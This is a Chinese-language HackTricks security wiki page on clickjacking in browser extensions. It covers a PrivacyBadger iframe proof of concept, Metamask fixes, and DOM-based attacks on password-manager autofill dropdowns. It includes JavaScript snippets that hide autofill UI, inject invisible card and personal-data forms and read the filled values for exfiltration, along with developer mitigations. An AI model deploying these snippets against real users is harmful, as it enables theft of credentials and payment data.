# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

此页面将利用浏览器扩展中的 ClickJacking 漏洞。\
如果你不知道 ClickJacking 是什么，请查看：


{{#ref}}
../clickjacking.md
{{#endref}}

扩展包含文件 **`manifest.json`**，该 JSON 文件具有字段 `web_accessible_resources`。以下是 [Chrome 文档](https://developer.chrome.com/extensions/manifest/web_accessible_resources) 关于它的说明：

> 这些资源随后可以通过 URL **`chrome-extension://[PACKAGE ID]/[PATH]`** 在网页中访问，该 URL 可以通过 **`extension.getURL method`** 生成。允许列入白名单的资源会以适当的 CORS 头提供，因此它们可通过像 XHR 之类的机制使用。[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

浏览器扩展中的 **`web_accessible_resources`** 不仅可以通过 web 访问；它们还以扩展固有的权限运行。这意味着它们有能力：

- 改变扩展的状态
- 加载额外资源
- 在一定程度上与浏览器交互

然而，这一特性也带来了安全风险。如果 **`web_accessible_resources`** 中的某个资源具有重要功能，攻击者可能将该资源嵌入到外部网页中。访问该页面的用户可能在不知情的情况下激活该嵌入资源。根据扩展资源的权限和能力，这种激活可能导致意想不到的后果。

## PrivacyBadger 示例

在扩展 PrivacyBadger 中，发现了一个漏洞，涉及 `skin/` 目录被声明为 `web_accessible_resources`，方式如下（查看原始 [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)）：
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
该配置导致了一个潜在的安全问题。具体来说，`skin/popup.html` 文件（在浏览器中与 PrivacyBadger 图标交互时呈现）可以被嵌入到一个 `iframe` 中。此类嵌入可被利用来欺骗用户无意中点击“Disable PrivacyBadger for this Website”。此类操作会通过禁用 PrivacyBadger 保护来泄露用户隐私，可能导致用户受到更多跟踪。可以在 ClickJacking 视频示例中查看此漏洞的可视化演示，链接为 [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)。

为了解决此漏洞，实施了一个简单的解决方案：从 `web_accessible_resources` 列表中移除 `/skin/*`。此更改通过确保无法通过 web-accessible resources 访问或操作 `skin/` 目录的内容，有效地缓解了该风险。

修复很简单：**remove `/skin/*` from the `web_accessible_resources`**。

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Example

一篇 [**关于 ClickJacking 在 metamask 中的 blog post 可在此处找到**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)。在此案例中，Metamask 通过检查访问它所用的协议为 **`https:`** 或 **`http:`**（例如不是 **`chrome:`**）来修复该漏洞：

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**另一个在 Metamask 扩展中修复的 ClickJacking** 是用户能够在一个因 `“web_accessible_resources”: [“inpage.js”, “phishing.html”]` 而被怀疑为 phishing 的页面上 **点击加入白名单 (Click to whitelist)**。由于该页面易受 Clickjacking 攻击，攻击者可以滥用它，先显示某些正常内容让受害者在不注意的情况下点击以加入白名单，然后再回到会被加入白名单的 phishing 页面。

## Steam Inventory Helper Example

查看以下页面以了解浏览器扩展中的 **XSS** 如何与 **ClickJacking** 漏洞链式结合：


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

经典的 extension clickjacking 滥用配置错误的 `web_accessible_resources` 来 iframe 特权 HTML 并驱动用户点击。新出现的一类，DOM-based extension clickjacking，直接针对 password managers 注入到页面 DOM 的 autofill 下拉菜单，利用 CSS/DOM 技巧在保持可点击的同时隐藏或遮挡它们。一次被强制的点击就可能选择一个已存储的项并将敏感数据填入攻击者控制的输入框。

### 威胁模型

- 攻击者控制一个网页（或在相关域上实现 XSS/子域接管/缓存中毒）。
- 受害者已安装并解锁了 password manager extension（有些即使名义上锁定也会进行 autofill）。
- 至少诱导一次用户点击（覆盖的 cookie 横幅、对话框、CAPTCHAs、游戏等）。

### 攻击流程（手动 autofill）

1. 注入一个不可见但可聚焦的表单（登录/PII/信用卡字段）。
2. 聚焦输入以在字段附近召唤 extension 的 autofill 下拉菜单。
3. 在保持可交互的同时隐藏或遮挡 extension 的 UI。
4. 在隐藏的下拉菜单下方对齐一个看起来可信的控件，诱导一次选择项的点击。
5. 从攻击者表单读取已填充值并将其外泄。

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- 在 open ShadowRoot 内的子元素（动态标签，隐藏内部 iframe）：
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- 父元素
- BODY/HTML 透明度技巧，以在页面看起来正常的同时使扩展 UI 隐形（例如，截图背景）：
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- 覆盖层
- 部分覆盖层：遮挡所有内容，仅留几像素以便下拉菜单仍然可点击（确保攻击者覆盖层在 DOM 中位于最后且具有最大的 z-index，或使用 Top Layer）。
- 使用 pointer-events:none 的全覆盖层，使点击穿透到底层隐藏的下拉菜单；使用 Popover API 保持其持续存在：
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### 定位受害者点击

- 固定放置：将隐藏的下拉菜单放置在看起来可信的控件下方，例如 “Accept cookies”、 “Close” 或一个 CAPTCHA 复选框。
- 跟随鼠标：将焦点输入框移动到光标下方，使下拉菜单跟随；定期重新聚焦，确保一次点击即可在任意位置选择一个项：
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### 影响与场景

- 攻击者控制的网站：一次被强制的点击就可能外泄信用卡信息（number/expiry/CVC）和非域限定的个人信息（name, email, phone, address, DOB）。
- 受信任的网站遭遇 XSS/subdomain takeover/cache poisoning：多次点击可窃取凭证（username/password）和 TOTP，因为许多管理器会在相关子域/父域之间自动填充（例如 `*.example.com`）。
- Passkeys：如果 RP 不将 WebAuthn 挑战与会话绑定，XSS 可以拦截已签名的断言；DOM-based clickjacking 隐藏 passkey 提示以诱导用户确认点击。

### 限制

- 至少需要一次用户点击和良好的像素对齐（逼真的覆盖层使得诱导点击变得容易）。
- 自动锁定/登出会缩短可利用时间窗；但有些管理器在“锁定”状态下仍会自动填充。

### 扩展开发者缓解措施

- 在 Top Layer (Popover API) 中渲染自动填充 UI，或以其他方式确保其位于页面堆叠之上；避免被页面控制的覆盖层遮盖。
- 防止 CSS 篡改：优先使用 Closed Shadow DOM，并使用 `MutationObserver` 监控 UI 根节点上的可疑样式变更。
- 在填充前检测恶意覆盖层：枚举其他 top-layer/popover 元素，临时禁用 `pointer-events:none`，并使用 `elementsFromPoint()` 检测遮挡；若存在覆盖层则关闭 UI。
- 在渲染前后检测 `<body>`/`<html>` 的透明度或样式异常变更。
- 对于基于 iframe 的问题：将 MV3 `web_accessible_resources` 的 `matches` 范围限定得更窄，避免暴露 HTML UI；若无法避免暴露 HTML，则返回 `X-Frame-Options: DENY` 或 `Content-Security-Policy: frame-ancestors 'none'`。

## 参考

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
